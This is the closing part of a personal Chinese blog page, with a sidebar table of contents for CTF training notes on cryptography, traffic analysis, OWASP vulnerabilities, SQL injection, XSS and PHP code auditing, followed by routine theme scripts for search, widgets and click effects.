class="nav-link" href="#题目3、好多苍蝇【蓝鲸】"><span class="nav-number">1.4.5.6.</span> <span class="nav-text">题目3、好多苍蝇【蓝鲸】</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考文章"><span class="nav-number">1.4.6.</span> <span class="nav-text">参考文章:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#密码学"><span class="nav-number">1.4.7.</span> <span class="nav-text">密码学</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#RSA学习"><span class="nav-number">1.4.7.1.</span> <span class="nav-text">RSA学习</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#RSA出题"><span class="nav-number">1.4.7.2.</span> <span class="nav-text">RSA出题</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#题目1：密钥生成"><span class="nav-number">1.4.7.3.</span> <span class="nav-text">题目1：密钥生成</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#参考文章-1"><span class="nav-number">1.4.7.4.</span> <span class="nav-text">参考文章</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#day02–Danie1"><span class="nav-number">1.5.</span> <span class="nav-text">day02–Danie1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#流量分析"><span class="nav-number">1.5.1.</span> <span class="nav-text">流量分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#经典题型"><span class="nav-number">1.5.2.</span> <span class="nav-text">经典题型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实例"><span class="nav-number">1.5.3.</span> <span class="nav-text">实例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#加解密"><span class="nav-number">1.5.4.</span> <span class="nav-text">加解密</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#day03–7iny"><span class="nav-number">1.6.</span> <span class="nav-text">day03–7iny</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言-1"><span class="nav-number">1.6.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#OWASP-TOP-10漏洞"><span class="nav-number">1.6.2.</span> <span class="nav-text">OWASP TOP 10漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#思维导图"><span class="nav-number">1.6.2.1.</span> <span class="nav-text">思维导图</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#TOP10漏洞介绍"><span class="nav-number">1.6.2.2.</span> <span class="nav-text">TOP10漏洞介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#A1-注入-Injection"><span class="nav-number">1.6.2.2.1.</span> <span class="nav-text">A1 注入 Injection</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#A2-失效的身份认证和会话管理-Broken-Authentication-and-Session-Management"><span class="nav-number">1.6.2.2.2.</span> <span class="nav-text">A2 失效的身份认证和会话管理  Broken Authentication and Session Management</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#A3-跨站脚本-XSS"><span class="nav-number">1.6.2.2.3.</span> <span class="nav-text">A3 跨站脚本-XSS</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#A4-不安全的直接对象引用-Insecurity-Direct-Object-Reference"><span class="nav-number">1.6.2.2.4.</span> <span class="nav-text">A4 不安全的直接对象引用 Insecurity Direct Object Reference</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#A5-安全配置错误-Security-Misconfiguration"><span class="nav-number">1.6.2.2.5.</span> <span class="nav-text">A5 安全配置错误 Security Misconfiguration</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#A6-敏感信息泄露-Sensitive-Data-Exposure"><span class="nav-number">1.6.2.2.6.</span> <span class="nav-text">A6 敏感信息泄露 Sensitive Data Exposure</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#A7-缺少功能级访问控制"><span class="nav-number">1.6.2.2.7.</span> <span class="nav-text">A7 缺少功能级访问控制</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#A8-跨站请求伪造-CSRF"><span class="nav-number">1.6.2.2.8.</span> <span class="nav-text">A8 跨站请求伪造 CSRF</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#A9-使用含有已知漏洞的组件"><span class="nav-number">1.6.2.2.9.</span> <span class="nav-text">A9 使用含有已知漏洞的组件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#A10-未验证的重定向和转发"><span class="nav-number">1.6.2.2.10.</span> <span class="nav-text">A10 未验证的重定向和转发</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql注入"><span class="nav-number">1.6.3.</span> <span class="nav-text">sql注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#简介"><span class="nav-number">1.6.3.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#教程推荐"><span class="nav-number">1.6.3.2.</span> <span class="nav-text">教程推荐</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sqlmap安装"><span class="nav-number">1.6.3.3.</span> <span class="nav-text">sqlmap安装</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sqlmap作用"><span class="nav-number">1.6.3.4.</span> <span class="nav-text">sqlmap作用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sqlmap基本操作"><span class="nav-number">1.6.3.5.</span> <span class="nav-text">sqlmap基本操作</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#CTF中的SQL注入"><span class="nav-number">1.6.3.5.1.</span> <span class="nav-text">CTF中的SQL注入</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS攻击"><span class="nav-number">1.6.4.</span> <span class="nav-text">XSS攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#介绍"><span class="nav-number">1.6.4.1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS的分类"><span class="nav-number">1.6.4.2.</span> <span class="nav-text">XSS的分类</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-反射型XSS"><span class="nav-number">1.6.4.2.1.</span> <span class="nav-text">1. 反射型XSS</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-存储型XSS"><span class="nav-number">1.6.4.2.2.</span> <span class="nav-text">2. 存储型XSS</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-DOM型XSS"><span class="nav-number">1.6.4.2.3.</span> <span class="nav-text">3. DOM型XSS</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#总结"><span class="nav-number">1.6.4.2.4.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#XSS在CTF中的运用"><span class="nav-number">1.6.4.2.5.</span> <span class="nav-text">XSS在CTF中的运用</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#参考文章-2"><span class="nav-number">1.6.4.2.6.</span> <span class="nav-text">参考文章</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#day03–Danie1"><span class="nav-number">1.7.</span> <span class="nav-text">day03–Danie1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php代码审计"><span class="nav-number">1.7.1.</span> <span class="nav-text">php代码审计</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#extract变量覆盖"><span class="nav-number">1.7.1.1.</span> <span class="nav-text">extract变量覆盖</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#多重加密"><span class="nav-number">1.7.1.2.</span> <span class="nav-text">多重加密</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#ereg正则-00截断"><span class="nav-number">1.7.1.2.1.</span> <span class="nav-text">ereg正则%00截断</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#strcmp比较字符串"><span class="nav-number">1.7.1.3.</span> <span class="nav-text">strcmp比较字符串</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sha-函数比较绕过"><span class="nav-number">1.7.1.4.</span> <span class="nav-text">sha()函数比较绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SESSION验证绕过"><span class="nav-number">1.7.1.5.</span> <span class="nav-text">SESSION验证绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#urldecode二次编码绕过"><span class="nav-number">1.7.1.6.</span> <span class="nav-text">urldecode二次编码绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#X-Forwarded-For绕过指定IP地址"><span class="nav-number">1.7.1.7.</span> <span class="nav-text">X-Forwarded-For绕过指定IP地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#md5加密相等绕过"><span class="nav-number">1.7.1.8.</span> <span class="nav-text">md5加密相等绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#strpos数组绕过NULL与ereg正则-00截断"><span class="nav-number">1.7.1.9.</span> <span class="nav-text">strpos数组绕过NULL与ereg正则%00截断</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#md5-函数-使用数组绕过"><span class="nav-number">1.7.1.10.</span> <span class="nav-text">md5()函数===使用数组绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ereg-函数strpos-函数用数组返回NULL绕过"><span class="nav-number">1.7.1.11.</span> <span class="nav-text">ereg()函数strpos() 函数用数组返回NULL绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#弱类型整数大小比较绕过"><span class="nav-number">1.7.1.12.</span> <span class="nav-text">弱类型整数大小比较绕过</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他常见web类型"><span class="nav-number">1.7.2.</span> <span class="nav-text">其他常见web类型</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#命令执行"><span class="nav-number">1.7.2.1.</span> <span class="nav-text">命令执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#git源码泄露"><span class="nav-number">1.7.2.2.</span> <span class="nav-text">git源码泄露</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#文件包含漏洞"><span class="nav-number">1.7.2.3.</span> <span class="nav-text">文件包含漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#简单脚本辅助"><span class="nav-number">1.7.2.4.</span> <span class="nav-text">简单脚本辅助</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#day03–yiyangqianxixxxx"><span class="nav-number">1.8.</span> <span class="nav-text">day03–yiyangqianxixxxx</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言-2"><span class="nav-number">1.8.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#渗透测试"><span class="nav-number">1.8.2.</span> <span class="nav-text">渗透测试</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#要求"><span class="nav-number">1.8.2.1.</span> <span class="nav-text">要求</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#流程"><span class="nav-number">1.8.2.2.</span> <span class="nav-text">流程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#信息收集"><span class="nav-number">1.8.2.3.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IP端口扫描"><span class="nav-number">1.8.2.4.</span> <span class="nav-text">IP端口扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#目录扫描"><span class="nav-number">1.8.2.5.</span> <span class="nav-text">目录扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#主机层漏洞"><span class="nav-number">1.8.2.6.</span> <span class="nav-text">主机层漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#中间件漏洞"><span class="nav-number">1.8.2.7.</span> <span class="nav-text">中间件漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#常见漏洞"><span class="nav-number">1.8.2.8.</span> <span class="nav-text">常见漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#工具"><span class="nav-number">1.8.2.9.</span> <span class="nav-text">工具</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#强调"><span class="nav-number">1.8.2.10.</span> <span class="nav-text">强调</span></a></li></ol></li></ol></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      
        <div class="back-to-top">
          <i class="fa fa-arrow-up"></i>
          
            <span id="scrollpercent"><span>0</span>%</span>
          
        </div>
      

    </div>
  </aside>


        
      </div>
    </main>
    
    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-snowflake-o"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">7iny</span>
		  
<!--注释Site words total count
   

    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">31.6k</span>
  
-->
</div>










        







        
      </div>
    </footer>

    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  
  

  

  

  


<!-- 代码块复制功能 -->
<script type="text/javascript" src="/js/src/clipboard.js"></script>  
<script type="text/javascript" src="/js/src/clipboard-use.js"></script>

<!--音乐播放器-->
<link rel="stylesheet" href="/dist/APlayer.min.css">
<div id="aplayer"></div>
<script type="text/javascript" src="/dist/APlayer.min.js"></script>
<script type="text/javascript" src="/dist/music.js"></script>

<!--崩溃欺骗-->
<script type="text/javascript" src="/js/src/crash_cheat.js"></script>

<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":55,"height":150},"mobile":{"show":false},"log":false,"tagMode":false});</script></body>
</html>
<!--富强民主点击特效-->
<script type="text/javascript"> 
/* 鼠标特效 */ 
var a_idx = 0; 
var b_idx = 0; 
/*   文字和颜色数组 */
var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正" ,"法治", "爱国", "敬业", "诚信", "友善"); 
var b = new Array("#FF0000","#FF7F00"," #FFFF00","#00FF00","#00FFFF","#0000FF","#8B00FF","#FF0000","#FF7F00"," #FFFF00","#00FF00","#00FFFF","#0000FF","#8B00FF");
jQuery(document).ready(function($) { 
    $("body").click(function(e) { 
       
        var $i = $("<span/>").text(a[a_idx]); 
          a_idx=parseInt(12*Math.random()); //文字随机数
          b_idx=parseInt(14*Math.random()); //颜色随机数
        var x = e.pageX, 
        y = e.pageY; 
        $i.css({ 
            "z-index": 999, 
            "font-size":"1.3em",            //字体大小
            "top": y - 20, 
            "left": x, 
            "position": "absolute", 
            "font-weight": "bold", 
            "color": b[b_idx] 
        }); 
        $("body").append($i); 
        $i.animate({ 
            "top": y - 180, 
            "opacity": 0 
        }, 
        1500, 
        function() { 
            $i.remove(); 
        }); 
    }); 
}); 
</script>
<!--富强民主点击特效-->